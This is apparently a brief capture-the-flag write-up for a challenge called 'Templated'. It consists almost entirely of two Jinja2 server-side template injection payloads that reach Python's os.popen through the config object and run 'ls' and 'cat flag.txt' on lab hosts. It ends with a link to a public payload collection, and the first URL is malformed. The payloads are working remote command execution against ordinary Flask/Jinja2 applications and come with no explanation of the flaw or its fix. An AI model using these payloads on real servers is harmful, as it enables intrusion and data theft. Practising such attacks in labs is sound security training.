# Templated
```
Export IP = 209.97.184.108:30558
```

## Payload 
```
#1. 
http://http://167.71.140.171:30179//()%7D%7D%7B%7Bconfig.__class__.__init__.__globals__['os'].popen('ls').read()%7D%7D

#2.
http://209.97.184.108:30558/()%7D%7D%7B%7Bconfig.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()%7D%7D
```

## Reference 
```
# --> Exploit the SSTI by calling subprocess.Popen. <--
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection
```